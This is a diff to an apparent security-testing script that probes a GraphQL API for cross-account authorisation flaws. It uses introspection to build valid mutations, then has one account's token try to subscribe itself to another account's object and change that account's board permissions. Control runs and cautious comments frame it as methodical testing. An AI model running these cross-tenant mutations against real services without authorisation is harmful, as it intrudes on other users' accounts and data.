@@ -76,6 +76,58 @@ def enum_values(type_name):
         return []
 
 
+SCALARS = {"String", "Int", "Float", "Boolean", "ID", "ISO8601DateTime", "JSON", "Date"}
+
+
+def selection_for(type_name, _cache={}):
+    """Scalar fields of a mutation's result type.
+
+    Hardcoding `{ id }` is what made phase 1 and phase 3 fail validation:
+    ImportDocFromHtmlResult and SetBoardPermissionResponse have no `id`. A query
+    rejected at validation never reaches the resolver, so those phases measured
+    nothing at all.
+    """
+    if type_name in _cache:
+        return _cache[type_name]
+    q = ('{ __type(name: "%s") { kind fields { name type { name kind ofType '
+         '{ name kind ofType { name kind } } } } } }' % type_name)
+    picked = []
+    try:
+        t = json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]
+        for f in t.get("fields") or []:
+            inner = f["type"]
+            while inner and not inner.get("name"):
+                inner = inner.get("ofType")
+            kind = (inner or {}).get("kind")
+            if (inner or {}).get("name") in SCALARS or kind == "ENUM":
+                picked.append(f["name"])
+    except Exception:
+        pass
+    _cache[type_name] = "{ %s }" % " ".join(picked[:6]) if picked else "{ __typename }"
+    return _cache[type_name]
+
+
+def result_type(field_name):
+    q = ('{ __type(name: "Mutation") { fields { name type { name kind ofType '
+         '{ name kind ofType { name kind } } } } } }')
+    try:
+        for f in json.loads(post(TOKEN_C, q, 0.4))["data"]["__type"]["fields"]:
+            if f["name"] != field_name:
+                continue
+            inner = f["type"]
+            while inner and not inner.get("name"):
+                inner = inner.get("ofType")
+            return (inner or {}).get("name")
+    except Exception:
+        pass
+    return None
+
+
+def sel(field_name):
+    rt = result_type(field_name)
+    return selection_for(rt) if rt else "{ __typename }"
+
+
 def verdict(body):
     low = body.lower()
     if "cannot query field" in low:
@@ -120,13 +172,17 @@ def phase1():
 
     markup = "".join(p.replace("MARK", MARK) for p, _, _ in MARKUP_PROBES)
     q = ('mutation { import_doc_from_html(html: %s, workspaceId: "%s", kind: %s, '
-         'title: "%s") { id name } }' % (json.dumps(markup), wid, kinds[0], MARK))
+         'title: "%s") %s }' % (json.dumps(markup), wid, kinds[0], MARK,
+                                 sel("import_doc_from_html")))
     body = post(TOKEN_B, q)
     print("  create: %s" % verdict(body))
     print("     %s%s%s" % (D, body[:260], N))
     save("import_doc_from_html.json", {"query": q, "response": body})
 
-    did = re.search(r'"id"\s*:\s*"?([\w-]+)"?', body)
+    # the result field is docId, not id - matching on "id" alone also matches
+    # the tail of "docId" in some encodings and misses it in others
+    did = re.search(r'"doc_?[iI]d"\s*:\s*"?([\w-]+)"?', body) or \
+          re.search(r'"id"\s*:\s*"?([\w-]+)"?', body)
     if not did:
         print("  %sno doc id returned - cannot read the document back.%s" % (Y, N))
         return
@@ -172,7 +228,7 @@ def phase2():
     control_ok = False
     if oid:
         q = ('mutation { add_subscribers_to_object(id: "%s", user_ids: ["%s"], kind: %s) '
-             '{ id } }' % (oid.group(1), B_USER, kinds[0]))
+             '%s }' % (oid.group(1), B_USER, kinds[0], sel("add_subscribers_to_object")))
         v = verdict(post(TOKEN_B, q))
         control_ok = "SUCCEEDED" in v
         print("  control  B -> B's own object   %s" % v)
@@ -183,13 +239,32 @@ def phase2():
               % Y)
         print("     authorisation - the mutation may simply not work this way.%s" % N)
 
+    # C's board id is not an object id. Passing one where the other is expected is
+    # what produced the internal server error last run - a type mismatch, not an
+    # authorisation result. Ask C's own token for a real object id first.
+    cown = post(TOKEN_C, "{ objects(limit: 1) { id name } }")
+    coid = re.search(r'"id"\s*:\s*"?([\w-]+)"?', cown)
+    if not coid:
+        print("  %sAccount C has no object, so there is no id to attack. Create one in"
+              % Y)
+        print("  C and re-run - the board id is a different type and produces a crash"
+              " rather than a result.%s" % N)
+        print("     %s%s%s" % (D, cown[:200], N))
+        return False
+    target_id = coid.group(1)
+    print("  %sC's object: %s%s" % (D, target_id, N))
+
     q = ('mutation { add_subscribers_to_object(id: "%s", user_ids: ["%s"], kind: %s) '
-         '{ id } }' % (C_BOARD, B_USER, kinds[0]))
+         '%s }' % (target_id, B_USER, kinds[0], sel("add_subscribers_to_object")))
     body = post(TOKEN_B, q)
     v = verdict(body)
-    print("  attack   B -> C's board %s   %s" % (C_BOARD, v))
+    print("  attack   B -> C's object %s   %s" % (target_id, v))
     print("     %s%s%s" % (D, body[:240], N))
     save("add_subscribers_to_object.json", {"query": q, "response": body})
+    if "error" in v and "denied" not in v:
+        print("     %sa crash is not a denial - the resolver never decided. Worth one"
+              % Y)
+        print("     note, but it is not evidence of a bypass.%s" % N)
     if "SUCCEEDED" in v:
         print("  %s%s>>> B subscribed itself to an object in account C." % (R, B))
         print("  Confirm from C's side that B appears as a subscriber, then stop.%s" % N)
@@ -215,7 +290,7 @@ def phase3():
     control_ok = False
     if bid:
         q = ('mutation { set_board_permission(board_id: "%s", basic_role_name: %s) '
-             '{ id } }' % (bid.group(1), role))
+             '%s }' % (bid.group(1), role, sel("set_board_permission")))
         v = verdict(post(TOKEN_B, q))
         control_ok = "SUCCEEDED" in v
         print("  control  B -> B's own board    %s" % v)
@@ -225,8 +300,8 @@ def phase3():
         print("     %sthe control did not succeed - a refusal below is not evidence.%s"
               % (Y, N))
 
-    q = ('mutation { set_board_permission(board_id: "%s", basic_role_name: %s) { id } }'
-         % (C_BOARD, role))
+    q = ('mutation { set_board_permission(board_id: "%s", basic_role_name: %s) %s }'
+         % (C_BOARD, role, sel("set_board_permission")))
     body = post(TOKEN_B, q)
     v = verdict(body)
     print("  attack   B -> C's board %s   %s" % (C_BOARD, v))
